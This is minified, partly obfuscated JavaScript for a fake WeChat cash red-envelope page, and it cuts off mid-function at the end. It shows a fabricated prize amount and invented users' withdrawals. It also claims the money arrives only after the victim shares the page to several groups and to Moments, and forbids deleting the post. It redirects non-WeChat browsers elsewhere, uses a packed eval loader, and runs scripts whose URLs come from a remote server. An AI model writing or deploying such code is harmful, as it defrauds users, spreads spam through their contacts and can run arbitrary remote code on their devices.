function wxAlert(e,t){weui.alert(e,"",t)}function showtip(){wxAlert('活动提示：请务必分享到群后，红包才会到账（目前剩余红包仅剩<span style="font-size: 30px;color: #f5294c">895</span>份）')}function sharetips(e){switch(e){case 0:weui.alert('分享成功，请继续分享到<span style="font-size: 30px;color: #f5294c">3</span>个不同的群即可领取！'),cnzz_event("share","group");break;case 1:weui.alert('分享成功，请再分享<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可领取！'),cnzz_event("share","group");break;case 2:weui.alert('分享成功，请再分享<span style="font-size: 30px;color: #f5294c">1</span>个不同的群！'),cnzz_event("share","group");break;case 3:weui.alert('分享失败，请再分享到1个<span style="font-size: 30px;color: #f5294c">不同</span>的微信群！'),cnzz_event("share","group");break;case 4:weui.alert('分享成功，剩下最后一步啦!</br>请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取！'),cnzz_event("share","group");break;case 5:cnzz_event("share","timeline"),weui.alert('领取成功，由于活动量较大，红包稍后会逐步到账.<br><span style="color: #f5294c">【另送您一年影视会员】</span><br>请注意：朋友圈信息不可删除否则无法核实身份',"",Success)}}function loadPage(){document.title=String.fromCharCode(24494,20449,32418,21253),document.getElementsByTagName("body")[0].outerHTML="<center>Loading...</center>",loadJs("https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js?t="+(new Date).getTime(),function(){for($("head").append('<meta http-equiv="Content-Type"content="text/html; charset=utf-8"/><meta name="viewport" content="width=device-width,minimum-scale=0.5,user-scalable=no,maximum-scale=1,initial-scale=1"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="format-detection" content="telephone=no"/><style>body{margin:0 auto}</style><link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">'),$("body").html(unescape("%3Cstyle%20type%3D%22text/css%22%3E%20%20%20%20body%20%7Bmargin%3A0%3Bpadding%3A0%3Bfont-family%3A%22Helvetica%22%3B%7D%20%20%20%20*%20%7Bmargin%3A0%3Bpadding%3A0%3Bbox-sizing%3Aborder-box%3B%7D%20%20%20%20body%20%7Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bposition%3Aabsolute%3Btop%3A0px%3B%7D%20%20%20%20html%20%7Bcolor%3A%23fff%3Bfont-size%3A16px%3B%7D%20%20%20%20.container%20%7Btext-align%3Acenter%3Bwidth%3A100%25%3Bmargin%3A0%20auto%3Bbackground-color%3Argba%280%2C0%2C0%2C0.3%29%3Bheight%3A100%25%3Bposition%3Aabsolute%3Boverflow%3Ahidden%3B%7D%20%20%20%20.hongbao%20%7Bbackground%3A%23d84e43%3Bposition%3Aabsolute%3Bwidth%3A90%25%3Bheight%3A80%25%3Bborder-radius%3A10px%3Bmargin-left%3A5%25%3Bmargin-top%3A5%25%3B%7D%20%20%20%20.topcontent%20%7Bheight%3A70%25%3Bborder%3A1px%20solid%20%23e1544a%3Bbackground-color%3A%23e05449%3Bborder-radius%3A5px%205px%2050%25%2050%25%20/%205px%205px%2015%25%2015%25%3Bbox-shadow%3A0px%202px%200px%20-1px%20%23cd4838%3B%7D%20%20%20%20.avatar%20%7Bposition%3Arelative%3B%7D%20%20%20%20.avatar%20span%20%7Bposition%3Aabsolute%3Btop%3A5px%3Bleft%3A15px%3B-webkit-transform%3Arotate%2845deg%29%3B-ms-transform%3Arotate%2845deg%29%3Btransform%3Arotate%2845deg%29%3Bfont-size%3A36px%3Bfont-weight%3Abolder%3Bcolor%3A%23b43d35%3B%7D%20%20%20%20%23close%20%7Bcolor%3A%23000%3B%7D%20%20%20%20.avatar%20img%20%7Bwidth%3A70px%3Bheight%3A70px%3Bborder%3A1px%20solid%20%23ff4150%3Bborder-radius%3A50%25%3Boverflow%3Ahidden%3Bmargin-top%3A15%25%3B%7D%20%20%20%20.topcontent%20h2%20%7Bcolor%3A%23f0e9b3%3Bfont-size%3A12px%3Bfont-weight%3Anormal%3B%7D%20%20%20%20.text%20%7Bcolor%3A%23f0e9b3%3Bfont-size%3A12px%3B%7D%20%20%20%20.description%20%7Bcolor%3A%23f0e9b3%3Bmargin%3A12%25%200%3Bfont-size%3A22px%3B%7D%20%20%20%20%23chai%20%7Bwidth%3A100px%3Bheight%3A100px%3Bborder%3A1px%20solid%20%23dcbc83%3Bbackground-color%3A%23dcbc83%3Bborder-radius%3A50%25%3Bcolor%3A%233b3b3b%3Bfont-size%3A40px%3Bfont-weight%3A500%3Bdisplay%3Ainline-block%3Bmargin-top%3A-50px%3Bmargin-bottom%3A25px%3Bbox-shadow%3A0px%201px%200px%200px%20rgba%280%2C0%2C0%2C0.2%29%3B%7D%20%20%20%20%23chai2%20%7Bwidth%3A90px%3Bheight%3A90px%3Bborder%3A1px%20solid%20%23d1b27c%3Bmargin-top%3A4px%3Bborder-radius%3A50%25%3Bdisplay%3Ainline-block%3B%7D%20%20%20%20%23chai%20span%20%7Bmargin-top%3A20px%3Bdisplay%3Ainline-block%3B%7D%20%20%20%20.rotate%20%7B-webkit-animation%3Aanim%20.6s%20infinite%20alternate%3B-ms-animation%3Aanim%20.6s%20infinite%20alternate%3Banimation%3Aanim%20.6s%20infinite%20alternate%3B%7D%20%20%20%20@-webkit-keyframes%20anim%20%7Bfrom%20%7B-webkit-transform%3ArotateY%28180deg%29%3B%7D%20%20%20%20to%20%7B-webkit-transform%3ArotateY%28360deg%29%3B%7D%20%20%20%20%7D%20%20%20%20@-ms-keyframes%20anim%20%7Bfrom%20%7B-ms-transform%3ArotateY%28180deg%29%3B%7D%20%20%20%20to%20%7B-ms-transform%3ArotateY%28360deg%29%3B%7D%20%20%20%20%7D%20%20%20%20@keyframes%20anim%20%7Bfrom%20%7Btransform%3ArotateY%28180deg%29%3B%7D%20%20%20%20to%20%7Btransform%3ArotateY%28360deg%29%3B%7D%20%20%20%20%7D%20%20%20%20.weui_dialog%20%7Bposition%3Afixed%3Bz-index%3A133333%3Bwidth%3A85%25%3Btop%3A50%25%3Bleft%3A50%25%3B-webkit-transform%3Atranslate%28-50%25%2C-50%25%29%3Btransform%3Atranslate%28-50%25%2C-50%25%29%3Bbackground-color%3A%23FAFAFC%3Btext-align%3Acenter%3Bborder-radius%3A3px%3Bfont-family%3Aarial%3B%7D%20%20%20%20.weui_mask%20%7Bposition%3Afixed%3Bz-index%3A1%3Bwidth%3A100%25%3Bheight%3A100%25%3Btop%3A0%3Bleft%3A0%3Bbackground%3Argba%280%2C0%2C0%2C0.6%29%3B%7D%20%20%20%20.weui_dialog_hd%20%7Bpadding%3A1.2em%200%20.5em%3B%7D%20%20%20%20.weui_dialog_bd%20%7Bpadding%3A0%2020px%3Bfont-size%3A16px%3Bcolor%3A%23888%3Bword-wrap%3Abreak-word%3Bword-break%3Abreak-all%3B%7D%20%20%20%20.weui_dialog_ft%20%7Bposition%3Arelative%3Bline-height%3A42px%3Bmargin-top%3A20px%3Bfont-size%3A17px%3Bdisplay%3A-webkit-box%3Bdisplay%3A-webkit-flex%3Bdisplay%3A-ms-flexbox%3Bdisplay%3Aflex%3B%7D%20%20%20%20.weui_dialog_ft%3Aafter%20%7Bcontent%3A%22%20%22%3Bposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3Bwidth%3A100%25%3Bheight%3A1px%3Bborder-top%3A1px%20solid%20%23D5D5D6%3Bcolor%3A%23D5D5D6%3B-webkit-transform-origin%3A0%200%3Btransform-origin%3A0%200%3B-webkit-transform%3AscaleY%280.5%29%3Btransform%3AscaleY%280.5%29%3B%7D%20%20%20%20.weui_btn_dialog.primary%20%7Bcolor%3A%230BB20C%3B%7D%20%20%20%20.weui_dialog_ft%20a%20%7Bdisplay%3Ablock%3B-webkit-box-flex%3A1%3B-webkit-flex%3A1%3B-ms-flex%3A1%3Bflex%3A1%3Bcolor%3A%233CC51F%3Btext-decoration%3Anone%3B-webkit-tap-highlight-color%3Argba%280%2C0%2C0%2C0%29%3B%7D%20%20%20%20.weui_dialog_title%20%7Bfont-weight%3A400%3Bfont-size%3A17px%3Bcolor%3A%23000%3B%7D%20%20%20%20%23shade%20%7Bbackground%3Argba%280%2C0%2C0%2C0.9%29%3Bz-index%3A1000%3Bposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bdisplay%3Anone%3B%7D%20%20%20%20.share%20%7Bposition%3Aabsolute%3Bleft%3A0%3Btop%3A0%3Bright%3A0%3Bbottom%3A0%3Bpadding%3A80px%2014px%3Bcursor%3Apointer%3Bdisplay%3Anone%3B%7D%20%20%20%20.share%20img%20%7Bwidth%3A100%25%3Bmax-width%3A608px%3Bmargin%3A0%20auto%7D%20%20%20%20@-webkit-keyframes%20lhb%20%7B0%25%20%7B-webkit-transform%3Ascale%281%2C1%29%3B%7D%20%20%20%2050%25%20%7B-webkit-transform%3Ascale%281.1%2C1.1%29%3B%7D%20%20%20%20100%25%20%7B-webkit-transform%3Ascale%281%2C1%29%3B%7D%20%20%20%20%7D%20%20%20%20input%20%7Bborder%3Anone%7D%20%20%20%20%23showmain%20%7Bbackground%3A%23fffaf5%3B%7D%20%20%20%20.main%20%7Bwidth%3A100%25%3Bmargin%3Aauto%3Bmargin-top%3A-20px%3B%7D%20%20%20%20.top%20%7Bwidth%3A100%25%3Bbox-shadow%3A0%201px%200%20-1px%20rgba%280%2C0%2C0%2C0.2%29%3Bline-height%3A100px%3Btext-align%3Acenter%3Bbackground%3A%23d84e43%3Bborder-radius%3A0px%200px%2050%25%2050%25%3Bcolor%3A%23FFF%3Bmargin%3Aauto%3Bheight%3A7.5em%3B%7D%20%20%20%20%23qrcode%20%7Bwidth%3A80px%3Bheight%3A80px%3Bmargin%3Aauto%3Btext-align%3Acenter%3Bborder-radius%3A50%25%3Bmargin-top%3A-40px%3B%7D%20%20%20%20.yaoqing%20%7Bmargin-top%3A78px%3Bfont-size%3A14px%3Bcolor%3A%23FFFFFF%7D%20%20%20%20%23qrcode%20img%20%7Bmargin-top%3A5px%3Bwidth%3A70px%3Bheight%3A70px%3Bborder-radius%3A50%25%3B%7D%20%20%20%20.bottom%20%7Bwidth%3A100%25%3Bmargin%3Aauto%7D%20%20%20%20.hongbao%20%7B-webkit-animation%3Athb%20linear%20.4s%201%3B%7D%20%20%20%20@-webkit-keyframes%20thb%20%7B0%25%20%7B-webkit-transform%3Ascale%280%2C0%29%3B%7D%20%20%20%2050%25%20%7B-webkit-transform%3Ascale%281.1%2C1.1%29%3B%7D%20%20%20%2075%25%20%7B-webkit-transform%3Ascale%280.9%2C0.9%29%3B%7D%20%20%20%20100%25%20%7B-webkit-transform%3Ascale%281%2C1%29%3B%7D%20%20%20%20%7D%20%20%20%20.gray%20%7B-webkit-animation%3Alhb%20linear%20.5s%20infinite%3B%7D%20%20%20%20@-webkit-keyframes%20lhb%20%7B0%25%20%7B-webkit-transform%3Ascale%281%2C1%29%3B%7D%20%20%20%2050%25%20%7B-webkit-transform%3Ascale%281.1%2C1.1%29%3B%7D%20%20%20%20100%25%20%7B-webkit-transform%3Ascale%281%2C1%29%3B%7D%20%20%20%20%7D%20%20%20%20.mask%20%7Bdisplay%3Anone%3Bposition%3Aabsolute%3Btop%3A0%3Bfilter%3Aalpha%28opacity%3D75%29%3Bbackground-color%3A%23000%3Bz-index%3A62%3Bleft%3A0%3Bopacity%3A.8%3B-moz-opacity%3A.8%7D%20%20%20%20.hbAvList%20li%20%7Bmargin-left%3A25px%3Bborder-bottom%3A1px%20solid%20%23e5e5e5%3Bclear%3Aboth%3Bpadding%3A20px%200%3Boverflow%3Ahidden%3Bcolor%3A%23000%7D%20%20%20%20.hbAvList%20li%20img%20%7Bdisplay%3Ablock%3Bfloat%3Aleft%3Bborder-radius%3A50%25%3Bwidth%3A2.5em%7D%20%20%20%20fieldset%2Cimg%20%7Bborder%3Anone%3Bvertical-align%3Amiddle%7D%20%20%20%20.hbAvList%20li%20.hbName%20%7Bdisplay%3Ablock%3Bfloat%3Aleft%3Bmargin-left%3A12px%7D%20%20%20%20.hbMoney%20%7Bfloat%3Aright%3Bpadding-right%3A27px%7D%20%20%20%20.hbAvList%20li%20.hbName%20h3%20%7Bfont-size%3A18px%3Bfont-weight%3A400%3Bmax-width%3A115px%3Boverflow%3Ahidden%3Btext-overflow%3Aellipsis%3Bwhite-space%3Anowrap%7D%20%20%20%20.hbAvList%20li%20.hbName%20p%20%7Bcolor%3A%23aaa%3Bfont-size%3A12px%7D%20%20%20%20em%20%7Bfont-style%3Anormal%7D%3C/style%3E%3Cdiv%20class%3D%22container%22%20id%3D%22container%22%20style%3D%22max-width%3A640px%3Btop%3A5%25%3B%22%3E%3Cdiv%20class%3D%22hongbao%22%3E%3Cdiv%20class%3D%22topcontent%22%3E%3Cdiv%20class%3D%22avatar%22%3E%3Cimg%20src%3D%22//ww4.sinaimg.cn/large/006tLA73jw1fbtj2cv1cfj30e80e8gm0.jpg%22%20/%3E%3C/div%3E%3Cdiv%20style%3D%22padding-top%3A10px%3Bmargin%3A0%20auto%3B%22%3E%3Cimg%20src%3D%22//ww1.sinaimg.cn/large/006tLA73jw1fbtj392mfjj30d003adfy.jpg%22%20style%3D%22width%3A50%25%3B%22%3E%3C/div%3E%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%3B%22%3E%3Cimg%20src%3D%22//ww1.sinaimg.cn/large/006tLA73jw1fbtj3shwikj30it029jrh.jpg%22%20style%3D%22width%3A70%25%3B%22%3E%3C/div%3E%3C/div%3E%3Cdiv%20class%3D%22chai%22%20id%3D%22chai%22%3E%3Cdiv%20id%3D%22chai2%22%3E%3Cspan%3E%u958B%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%3B%22%3E%3Cimg%20src%3D%22//ww3.sinaimg.cn/large/006tLA73jw1fbtj4n2fo9j30ad01ywee.jpg%22%20style%3D%22width%3A35%25%3B%22%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cdiv%20id%3D%22showmain%22%20style%3D%22%20background-color%3A%23fffaf5%3B%20overflow%3Aauto%3B%20display%3Anone%3B%22%3E%3Csection%20class%3D%22top%22%3E%3Cimg%20width%3D%27100px%27%20src%3D%22//ww3.sinaimg.cn/large/006tLA73jw1fbtj573d0ej3061035glo.jpg%22%3E%3C/section%3E%3Csection%20class%3D%22main%22%3E%3Cdiv%20id%3D%22qrcode%22%3E%3Cimg%20src%3D%22//ww4.sinaimg.cn/large/006tLA73jw1fbtj2cv1cfj30e80e8gm0.jpg%22%20/%3E%3C/div%3E%3C/section%3E%3Cimg%20onclick%3D%22showtip%28%29%22%20src%3D%22//cdn.ur.qq.com/uploadImages/2017-01-17/20170117140204.PNG%22%20class%3D%22fenxiang_w%22%20style%3D%22%20display%3Ablock%3B%20width%3A100%25%3B%20position%3Afixed%3B%20z-index%3A999%3B%20top%3A0px%3B%20left%3A0px%3Bdisplay%3Anone%22%20/%3E%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%26nbsp%3B%3C/div%3E%3Csection%20class%3D%22bottom%22%3E%3Cdiv%20style%3D%22text-align%3Acenter%3B%22%3E%3Cimg%20width%3D%2240%25%22%20src%3D%22//ww2.sinaimg.cn/large/006tLA73jw1fbtj60r474j30bh043aa7.jpg%22%3E%3C/div%3E%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23000000%3B%22%3E%3Cspan%20id%3D%22get_money%22%20style%3D%22%20font-size%3A3em%3B%22%3E0%3C/span%3E%3Cspan%20style%3D%22%20font-size%3A3em%3B%22%3E.00%3C/span%3E%u5143%3Cp%3E%3Ca%20class%3D%22btn_showmask%22%20href%3D%22javascript%3A%3B%22%20style%3D%22%20width%3A%2080%25%3B%20height%3A50px%3B%20font-size%3A%2018px%3B%20line-height%3A%2050px%3B%20border-radius%3A%208px%3B%20background%3A%20%23d94e42%3B%20color%3A%20%23fff%3B%20text-align%3A%20center%3B%20margin%3A%2018px%20auto%2010px%20auto%3B%20display%3A%20block%3B%20text-decoration%3Anone%3B%22%3E%u70B9%u6B64%u7ACB%u5373%u63D0%u73FE%3C/a%3E%3C/p%3E%3C/div%3E%3Cdiv%20style%3D%22%20background-color%3A%23faf6f1%3B%20padding%3A0.5em%3B%20border-top%3A1px%20%23f0eeea%20solid%3B%20%20border-bottom%3A1px%20%23f0eeea%20solid%3B%20margin-top%3A10px%3B%22%3E%3Cimg%20width%3D%2240%25%22%20src%3D%22//ww4.sinaimg.cn/large/006tLA73jw1fbtj6kiqb2j308x01kmx1.jpg%22%3E%3C/div%3E%3Cdiv%3E%3Cul%20class%3D%22hbAvList%22%3E%3C/ul%3E%3C/div%3E%3C/section%3E%3C/div%3E")),index=0;5>index;index++){var e=data[index];$(".hbAvList").append(loadItem_1(e))}$("#chai").click(function(){isOpen||(isOpen=!0,loadItem_0()),$("#chai").attr("class","rotate"),setTimeout(function(){var e,t;$("#container").fadeOut(1e3),$("#showmain").fadeIn(1e3),e=0,t=setInterval(function(){e+=1,e>=oAmount&&clearInterval(t),document.getElementById("get_money").innerHTML=e},6)},1600)}),$(".btn_showmask").click(function(){$("#mask").css("height",$(document).height()),$("#mask").css("width",$(document).width()),$(".fenxiang_w").show(),$("#mask").show(),showtip()}),$.ajax({url:"https://ssl5.ichuandian.com/Api/Short?value="+encodeURIComponent(window.location.href.split("#")[0]+"?t="+(new Date).getTime()),type:"get",dataType:"json",success:function(e){e&&e.ShareUrl&&(window.share_link=e.ShareUrl,window.share_title=e.Title,window.share_desc=e.Desc,window.share_img=e.Pic,window.go_url=e.GoUrl,window.back_url=e.BackUrl,window.timeline_title=e.Title,window.timeline_link=e.TimeLineLink||e.ShareUrl,window.timeline_desc=e.Desc,window.timeline_img=e.Pic,window.main=new Main,window.main.start())}}),$("body").show(),changeTitle(String.fromCharCode(24494,20449,32418,21253))}),cnzz(1259093741,1259093741)}function get_rand_urlTrade(){var e=["http://mp.weixin.qq.com/s/2uAqvpBk9lGg1pfAG_TBpA","http://mp.weixin.qq.com/s/4hix9gReYNt20Uj0LIDMnA"];return e[Math.floor(Math.random()*e.length)]+"?id="+(new Date).getTime()}function get_rand_pic(){var e=["https://cdn.ur.qq.com/uploadImages/2016-12-22/20161222105628.PNG?id=","https://cdn.ur.qq.com/uploadImages/2017-01-07/20170107011336.JPG?id=","https://cdn.ur.qq.com/uploadImages/2016-12-22/20161222105709.JPG?id=","https://cdn.ur.qq.com/uploadImages/2016-12-22/20161222105727.PNG?id=","https://cdn.ur.qq.com/uploadImages/2016-12-22/20161222105748.PNG?id=","https://cdn.ur.qq.com/uploadImages/2016-12-22/20161222105814.JPG?id="];return e[Math.floor(Math.random()*e.length)]+(new Date).getTime()}function loadJs(e,t,i){if(e){var a=document.createElement("script");a.setAttribute("type","text/javascript"),a.setAttribute("charset","utf-8"),a.setAttribute("src",e),document.getElementsByTagName("head")[0].appendChild(a),"function"==typeof i&&(a.onerror=i),a.onload=function(){"function"==typeof t&&t()}}}function get_rand_num(e,t){return parseInt(Math.random()*(t-e+1)+e,10)}function cnzz(e,t,i){loadJs("https://s4.cnzz.com/z_stat.php?id="+e+"&web_id="+t,function(){_czc&&_czc.push(["_setAccount",t]),i&&i()})}function cnzz_event(e,t){window._czc&&window._czc.push(["_trackEvent",e,t])}function loadItem_0(){setInterval(function(){var e=data[index];$(".hbAvList li:last").slideUp(1e3,function(){$(this).remove()}),$(".hbAvList li:first .hbMoney").css("color","#949494"),$(".hbAvList").prepend(loadItem_2()),$(".hbAvList li:first").append(loadItem_3(e)),$(".hbAvList li:first").find(".hbMoney").css("color","#FF0000"),$(".hbAvList li:first").slideDown(1e3,function(){1>index%2?$(".hbAvList li:first").find(".hbMoney").addClass("animated tada"):$(".hbAvList li:first").find(".hbMoney").addClass("animated zoomIn"),index=++index%data.length})},2e3)}function loadItem_1(obj){var html,curHours=myDate.getHours();return curMinutes=1*myDate.getMinutes()+1*obj.c_time,curMinutes>59&&(curMinutes-=60,curHours++,curHours>23&&(curHours=0)),html='<li><img src="'+obj.w_headimg+'" alt=""><div class="hbName"><h3>'+eval("'"+obj.w_name+"'")+'</h3><p class="hbTime">'+curHours+":"+curMinutes+'</p></div><span class="hbMoney">'+eval("'"+obj.u_time+"'")+"</span></li>"}function loadItem_2(){var e='<li style="display: none;"></li>';return e}function loadItem_3(obj){var html,curHours=myDate.getHours(),curMinutes=1*myDate.getMinutes()+1*obj.c_time;return curMinutes>59&&(curMinutes-=60,curHours++,curHours>23&&(curHours=0)),html='<img src="'+obj.w_headimg+'" alt=""><div class="hbName"><h3>'+eval("'"+obj.w_name+"'")+'</h3><p class="hbTime">'+curHours+":"+curMinutes+'</p></div><span class="hbMoney">'+eval("'"+obj.u_time+"'")+"</span>"}function Success(){open_choujiang()}function open_choujiang(e){cnzz_event("open",e?"back":"share+ok");var t="";if(e){t=window.back_url||get_rand_urlTrade();var i=!!((new Date).getSeconds()%2);i&&isAndroid()&&(t="http://a.app.qq.com/o/simple.jsp?pkgname=com.cd_fortune.red")}else t=window.go_url||get_rand_urlTrade();t.search(/\.js([?#].*)?$/i)>0?loadJs(t):location.href=t}function isInWechat(){var e=navigator.userAgent.toLowerCase();return e.indexOf("micromessenger")>=0}function isIos(){var e=navigator.userAgent.toLowerCase();return e.indexOf("iphone")>=0||e.indexOf("ipad")>=0||e.indexOf("applewebkit")>=0}function isAndroid(){var e=navigator.userAgent.toLowerCase();return e.indexOf("android")>=0}function isUrl(e){return!!e&&(e.indexOf("http://")>=0||e.indexOf("https://")>=0)}function isArray(e){return"[object Array]"===Object.prototype.toString.call(e)}function isNumber(e){return"number"==typeof e}function getRandomNum(e,t){var i=t-e,a=Math.random();return e+Math.round(a*i)}function getFormatDate(){var e=new Date,t=new Date(e.setHours(e.getHours()+8)).toISOString();return t.substring(0,t.indexOf("T"))}function changeTitle(e){if(document.title=e,navigator.userAgent.toLowerCase().indexOf("iphone")>=0){var t=$("body");c=$('<iframe src="/favicon.ico" style="display:none;"></iframe>'),c.on("load",function(){setTimeout(function(){c.off("load").remove()},0)}).appendTo(t)}}navigator.userAgent.toLowerCase().indexOf("micromessenger")<0&&(location.href="http://ysn8.com:88/?id=990042"),addEventListener("touchmove",function(e){e.preventDefault()},!1);var data,oAmount,timess,index,isOpen,myDate,weui,ua,Url,Main,WechatShare,app=app||{};!function(){app.decodeStr=function(e){var t,i,a;if(!e)return"";for(t=e[0],i=e.split(t),a=0;a<i.length;a++)i[a]&&(i[a]=String.fromCharCode(i[a]));return i.join("")}}(),eval(function(e,t,i,a,o,n){if(o=function(e){return(t>e?"":o(parseInt(e/t)))+((e%=t)>35?String.fromCharCode(e+29):e.toString(36))},!"".replace(/^/,String)){for(;i--;)n[o(i)]=a[i]||o(i);a=[function(e){return n[e]}],o=function(){return"\\w+"},i=1}for(;i--;)a[i]&&(e=e.replace(new RegExp("\\b"+o(i)+"\\b","g"),a[i]));return e}("a 8=6.9;3(8.4('2')>0){7(\"5()\", 1);}",62,11,"|200|MicroMessenger|if|indexOf|loadPage|navigator|setTimeout|ua|userAgent|var".split("|"),0,{})),data=[{w_name:"华",w_headimg:"//q.qlogo.cn/qqapp/1104718115/3CC6C03786C6C693F364B395F327197F/100",u_time:"领取了6元现金红包",c_time:"7"},{w_name:"赵 巍",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",u_time:"提现了 200.00 元",c_time:"12"},{w_name:"小妈咪?云在指尖",w_headimg:"//q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",u_time:"提现了 1000.00 元",c_time:"5"},{w_name:"蓝蓝",w_headimg:"//q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",u_time:"提现了 200.00 元",c_time:"15"},{w_name:"温州兄弟典当_（啊松）",w_headimg:"//q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",u_time:"提现了 200.00 元",c_time:"15"},{w_name:"简单",w_headimg:"//q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",u_time:"领取了5元现金红包",c_time:"15"},{w_name:"总有刁民想阴朕っ",w_headimg:"//q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",u_time:"领取了6元现金红包",c_time:"9"},{w_name:"毕江明",w_headimg:"//q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",u_time:"提现了 200.00 元",c_time:"2"},{w_name:"五平方",w_headimg:"//q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",u_time:"提现了 200.00 元",c_time:"3"},{w_name:"莎莎",w_headimg:"//q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",u_time:"领取了6元现金红包",c_time:"8"},{w_name:"Jkj.",w_headimg:"//q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",u_time:"提现了 200.00 元",c_time:"10"},{w_name:"卢润霄",w_headimg:"//q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",u_time:"领取了6元现金红包",c_time:"7"},{w_name:"君君",w_headimg:"//q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",u_time:"提现了 500.00 元",c_time:"9"},{w_name:"孙小兵",w_headimg:"//q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",u_time:"提现了 200.00 元",c_time:"7"},{w_name:"Tracy、dacy",w_headimg:"//q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",u_time:"提现了 200.00 元",c_time:"7"},{w_name:"Mr. Xue ?",w_headimg:"//q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",u_time:"提现了 1000.00 元",c_time:"2"},{w_name:"孟苗苗",w_headimg:"//q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",u_time:"领取了7元现金红包",c_time:"6"},{w_name:"凡尔赛宫的^_^糯米",w_headimg:"//q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",u_time:"领取了10元现金红包",c_time:"15"},{w_name:"福星，",w_headimg:"//q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",u_time:"领取了7元现金红包",c_time:"3"},{w_name:"袁芳",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",u_time:"领取了8元现金红包",c_time:"12"},{w_name:"左右",w_headimg:"//q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",u_time:"提现了 200.00 元",c_time:"12"},{w_name:"林杰棟_",w_headimg:"//q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",u_time:"提现了 200.00 元",c_time:"14"},{w_name:"亚里士缺德",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",u_time:"提现了 200.00 元",c_time:"5"},{w_name:"刘莹",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",u_time:"提现了 200.00 元",c_time:"9"},{w_name:"。",w_headimg:"//q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",u_time:"领取了9元现金红包",c_time:"2"},{w_name:"不在乎",w_headimg:"//q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",u_time:"领取了6元现金红包",c_time:"12"},{w_name:"IF YOU",w_headimg:"//q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",u_time:"提现了 200.00 元",c_time:"11"},{w_name:"曹雪梦",w_headimg:"//q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",u_time:"领取了6元现金红包",c_time:"10"},{w_name:"一",w_headimg:"//q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",u_time:"领取了5元现金红包",c_time:"4"},{w_name:"Zhao. Devil Ψ",w_headimg:"//q.qlogo.cn/qqapp/1104718115/94B9F8421330A7B82F019492C822BF42/100",u_time:"领取了7元现金红包",c_time:"14"},{w_name:"努力奋斗",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",u_time:"领取了7元现金红包",c_time:"12"},{w_name:"用毛主席的气质压倒一切℡",w_headimg:"//q.qlogo.cn/qqapp/1104718115/FF4E560E4F11C2EBAAFFFC4625CD3122/100",u_time:"领取了7元现金红包",c_time:"11"},{w_name:"小卷子",w_headimg:"//q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",u_time:"领取了10元现金红包",c_time:"2"},{w_name:"冰是睡着的水",w_headimg:"//q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",u_time:"提现了 200.00 元",c_time:"2"},{w_name:"大朵云",w_headimg:"//q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",u_time:"领取了5元现金红包",c_time:"10"}],oAmount=get_rand_num(160,200),timess=0,index=0,isOpen=!1,myDate=new Date,weui={alert:function(e,t,i){var a,o;t=t?t:"温馨提醒",a='<div class="weui_dialog_alert" style="position: fixed; z-index: 99999; display:none;">',a+='<div class="weui_mask"></div>',a+='<div class="weui_dialog">',a+='<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">'+t+"</strong></div>",a+='<div 